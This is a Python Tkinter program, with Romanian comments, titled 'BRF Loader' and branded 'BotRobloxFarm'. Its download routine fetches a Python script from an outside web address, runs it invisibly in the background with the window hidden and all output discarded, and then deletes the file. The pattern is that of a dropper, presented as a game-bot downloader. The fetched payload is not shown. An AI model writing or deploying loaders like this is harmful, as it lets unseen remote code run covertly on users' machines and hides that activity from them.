import tkinter as tk
from tkinter import font
import threading
import time
import urllib.request
import subprocess
import sys
import os
import tempfile

class BRFApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BRF Loader")
        
        # Blochează redimensionarea
        self.root.resizable(False, False)
        
        # Dimensiuni
        self.root.geometry("400x250")
        self.root.configure(bg='#0a0a0a')
        
        # Frame principal
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Titlu
        title_label = tk.Label(
            main_frame,
            text="BRF DOWNLOADER",
            font=("Arial", 20, "bold"),
            fg="#00FFAA",
            bg="#0a0a0a"
        )
        title_label.pack(pady=(0, 20))
        
        # Buton START
        self.start_btn = tk.Button(
            main_frame,
            text="START DOWNLOAD",
            font=("Arial", 14, "bold"),
            fg="white",
            bg="#00AA66",
            activebackground="#00CC88",
            activeforeground="white",
            bd=0,
            padx=30,
            pady=10,
            command=self.start_download
        )
        self.start_btn.pack(pady=10)
        
        # Text pentru status
        self.status_label = tk.Label(
            main_frame,
            text="Apasă START pentru a începe",
            font=("Consolas", 12),
            fg="#888888",
            bg="#0a0a0a",
            height=2
        )
        self.status_label.pack(pady=10)
        
        # Buton EXIT
        exit_btn = tk.Button(
            main_frame,
            text="EXIT",
            font=("Arial", 12),
            fg="white",
            bg="#FF4444",
            activebackground="#FF6666",
            activeforeground="white",
            bd=0,
            padx=20,
            pady=5,
            command=self.root.destroy
        )
        exit_btn.pack(pady=5)
        
        # Variabilă pentru control
        self.downloading = False
        
        # Centrează fereastra
        self.center_window()
        
        # Rulează aplicația
        self.root.mainloop()
    
    def center_window(self):
        """Centrează fereastra"""
        self.root.update_idletasks()
        width = 400
        height = 250
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def start_download(self):
        """Pornește downloadul într-un thread separat"""
        if not self.downloading:
            self.downloading = True
            self.start_btn.config(state='disabled', text="DOWNLOADING...")
            
            # Pornește thread pentru download
            thread = threading.Thread(target=self.download_process, daemon=True)
            thread.start()
    
    def download_process(self):
        """Procesul de download în background"""
        try:
            # PAS 1: Preparing
            self.update_status("⏳ Preparing download...")
            time.sleep(1)
            
            # PAS 2: Downloading
            self.update_status("⬇️ Downloading BRF script...")
            
            url = "https://brf-eight.vercel.app/brf.py"
            temp_path = ""
            
            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
                temp_path = f.name
                urllib.request.urlretrieve(url, temp_path)
            
            # PAS 3: Executing
            self.update_status("⚡ Executing script...")
            time.sleep(1)
            
            # Rulează scriptul SILENȚIOS
            startupinfo = None
            if sys.platform == "win32":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
            
            # Rulează în fundal
            subprocess.Popen(
                [sys.executable, temp_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # PAS 4: Cleaning
            self.update_status("🧹 Cleaning up...")
            time.sleep(1)
            
            # Șterge fișierul temporar
            try:
                for _ in range(3):
                    try:
                        os.unlink(temp_path)
                        break
                    except:
                        time.sleep(0.1)
            except:
                pass
            
            # PAS 5: Done
            self.update_status("✅ Download complete!\nScript is running in background.")
            time.sleep(2)
            
            # Arată fereastra cu BRF
            self.show_brf_window()
            
        except Exception as e:
            self.update_status(f"❌ Error: {str(e)[:50]}")
        finally:
            self.downloading = False
            self.root.after(100, self.reset_button)
    
    def update_status(self, message):
        """Actualizează status label"""
        self.root.after(0, lambda: self.status_label.config(text=message))
    
    def reset_button(self):
        """Resetează butonul START"""
        self.start_btn.config(state='normal', text="START DOWNLOAD")
    
    def show_brf_window(self):
        """Arată fereastra cu BRF"""
        # Ascunde fereastra principală
        self.root.withdraw()
        
        # Creează fereastra BRF
        brf_window = tk.Toplevel()
        brf_window.title("BRF")
        brf_window.geometry("300x200")
        brf_window.configure(bg='#000000')
        brf_window.resizable(False, False)
        
        # Fără borduri și mereu deasupra
        brf_window.overrideredirect(False)
        brf_window.attributes('-topmost', True)
        
        # Adaugă conținut
        brf_label = tk.Label(
            brf_window,
            text="BRF",
            font=("Arial", 48, "bold"),
            fg="#00FFAA",
            bg="#000000"
        )
        brf_label.pack(expand=True)
        
        sub_label = tk.Label(
            brf_window,
            text="BotRobloxFarm",
            font=("Arial", 16),
            fg="#888888",
            bg="#000000"
        )
        sub_label.pack()
        
        # Buton close
        close_btn = tk.Button(
            brf_window,
            text="CLOSE",
            font=("Arial", 12),
            fg="white",
            bg="#FF4444",
            command=lambda: [brf_window.destroy(), self.root.destroy()]
        )
        close_btn.pack(pady=20)
        
        # Centrează
        brf_window.update_idletasks()
        width, height = 300, 200
        screen_width = brf_window.winfo_screenwidth()
        screen_height = brf_window.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        brf_window.geometry(f'{width}x{height}+{x}+{y}')

# Pornire aplicație
if __name__ == "__main__":
    app = BRFApp()
